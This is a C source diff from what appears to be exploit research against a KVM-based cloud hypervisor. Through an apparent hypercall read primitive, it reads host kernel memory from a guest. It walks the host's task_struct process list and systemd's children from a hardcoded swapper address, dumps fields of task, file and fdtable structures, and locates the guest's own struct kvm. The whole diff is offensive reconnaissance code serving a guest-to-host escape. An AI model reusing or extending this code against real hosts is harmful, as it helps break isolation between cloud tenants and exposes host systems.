@@ -297,6 +297,18 @@ void translator_exam_feeling(hpa_t base, hva_t hdm, hpa_t eptp, hpa_t hcr3, hpa_
 	printf("\n");
 }
 
+void get_feeling_dump_task(hva_t task)
+{
+	u64 pids = hc_read_va(task+H_TASK_PID);
+	char comm[16];
+	*(u64 *)&comm[0] = hc_read_va(task+H_TASK_COMM);
+	*(u64 *)&comm[8] = hc_read_va(task+H_TASK_COMM+8);
+	printf("task %16lx: pid = %7d, tgid = %7d, comm = \"%s\"\n", task, (int)pids, (int)(pids >> 32), comm);
+
+	// for (int off = -0x40; off < 0x40; off += 8)
+	// 	dump(hc_read_va(task+H_TASK_COMM+off));
+}
+
 void get_feeling_for_kernel_kvm_data_structures(void)
 {
 	uintptr_t direct_map = hc_direct_map();
@@ -342,44 +354,36 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	}
 	printf("\n");
 
-	uintptr_t task_struct = hc_read_va(pid+0x20) - 0xa40; // pid's tasks[0], pointing to task_struct's pid_links[0]
+	uintptr_t task_struct = hc_read_va(pid+0x20) - H_TASK_PID_LINKS; // pid's tasks[0], pointing to task_struct's pid_links[0]
 	hva_t own_task_struct = task_struct;
 	dump(task_struct);
 	for (int off = 0; off < 0x80; off += 8) {
 		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
 	}
 	printf("...\n");
-	for (int off = 0x900-0x40; off < 0x900+0xb0; off += 8) {
+	for (int off = 0x8c0; off < 0xc40; off += 8) {
 		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
 	}
-	printf("...\n");
-	for (int off = 0x9d0-0x20; off < 0x9d0+0x20; off += 8) {
-		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
-	}
-	printf("...\n");
-	for (int off = 0xbf0-0x40; off < 0xbf0+0x40; off += 8) {
-		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
-	}
-	printf("\n");
+	printf("\n"); 
 
 	// Don't start with our own thread, as it may not be the thread group's
 	// leader, and hence not be itself linked into the task-list.
 	task_struct = hc_read_va(task_struct + 0x908) - 0x900; // task_struct's tasks.prev
 
-	int nr_processes = 0;
-	uintptr_t start = task_struct;
-	do {
-		int pidd = (int)hc_read_va(task_struct + 0x9d0); // task_struct's pid
-		int tgid = (int)hc_read_va(task_struct + 0x9d4); // task_struct's tgid
-		char comm[16];
-		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
-		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
-		if (0) printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
+	// int nr_processes = 0;
+	// uintptr_t start = task_struct;
+	// do {
+	// 	int pidd = (int)hc_read_va(task_struct + H_TASK_PID); // task_struct's pid
+	// 	int tgid = (int)hc_read_va(task_struct + H_TASK_PID+4); // task_struct's tgid
+	// 	char comm[16];
+	// 	*(uint64_t *)comm = hc_read_va(task_struct + H_TASK_COMM);
+	// 	*(uint64_t *)&comm[8] = hc_read_va(task_struct + H_TASK_COMM + 8);
+	// 	if (0) printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
 
-		nr_processes++;
-		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
-	} while (task_struct != start);
-	printf("nr_processes: %d\n\n", nr_processes);
+	// 	nr_processes++;
+	// 	task_struct = hc_read_va(task_struct + H_TASK_TASKS) - H_TASK_TASKS; // task_struct's tasks.next
+	// } while (task_struct != start);
+	// printf("nr_processes: %d\n\n", nr_processes);
 
 	#define KVM_MID 0x1128
 	#define KVM_RAD 0x10
@@ -734,7 +738,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	printf(">>> Find struct kvm from our own task_struct (via open files):\n");
 
 	dump(own_task_struct);
-	for (int off = 0; off < 0x70; off += 8) {
+	for (int off = 0; off < 0x100; off += 8) {
 		printf("own_task_struct+H_TASK_COMM+%4x = %16lx %s\n", off, hc_read_va(own_task_struct+H_TASK_COMM+off),
 			off == 0x48 ? "<-- struct files_struct *files" : "");
 	}
@@ -742,7 +746,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 
 	hva_t files = hc_read_va(own_task_struct+H_TASK_FILES);
 	dump(files);
-	for (int off = 0; off < 0x40; off += 8) {
+	for (int off = 0; off < 0x100; off += 8) {
 		printf("files+%4x = %16lx %s\n", off, hc_read_va(files+off),
 			off == 0x20 ? "<-- struct fdtable __rcu *fdt" : "");
 	}
@@ -764,7 +768,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	// }
 
 	hva_t fd0 = hc_read_va(fd + 0);
-	for (int off = 0; off < 0x40; off += 8) {
+	for (int off = 0; off < 0x100; off += 8) {
 		printf("fd0+%4x = %16lx %s\n", off, hc_read_va(fd0+off),
 			off == 0x20 ? "<-- void *private_data" : "");
 	}
@@ -776,10 +780,30 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	for (int i = 0; i < 0x28; i++) {
 		hva_t file = hc_read_va(fd+i*8);
 		for (int off = 0x20; off < 0x28; off += 8) {
-			printf("fd[%2x] = %16lx | fd[%2x]->private_data = %16lx %s\n", i, file, i, hc_read_va(file+H_FILE_PRIV),
-				hc_read_va(file+H_FILE_PRIV) == OWN_KVM ? "<-- struct kvm *OWN_KVM" : "");
+			u64 data = hc_read_va(file+H_FILE_PRIV);
+			printf("fd[%2x] = %16lx | fd[%2x]->private_data = %16lx %s  -->  %16lx %16lx %16lx %16lx %16lx\n", i, file, i, data,
+				hc_read_va(file+H_FILE_PRIV) == OWN_KVM ? "<-- struct kvm *OWN_KVM" : "",
+				hc_read_va(data), hc_read_va(data+8), hc_read_va(data+0x10), hc_read_va(data+0x18), hc_read_va(data+0x20));
 		}
 	}
+
+	printf("===================================================================\n");
+	printf("===================================================================\n");
+	printf("===================================================================\n");
+
+	printf(">>> Traverse parents and children of task_structs:\n");
+
+	hva_t swapp = 0xffffffff98e0ff00;
+	get_feeling_dump_task(swapp);
+	hva_t systemd = hc_read_va(swapp+H_TASK_TASKS) - H_TASK_TASKS;
+	get_feeling_dump_task(systemd);
+	hva_t entry = hc_read_va(systemd+H_TASK_CHILDREN);
+	do {
+		hva_t child = entry - H_TASK_SIBLING;
+		get_feeling_dump_task(child);
+		entry = hc_read_va(entry);
+	} while (entry != systemd+H_TASK_CHILDREN);
+
 }
 
 void reverse_host_kernel_data_structures_aws(void)
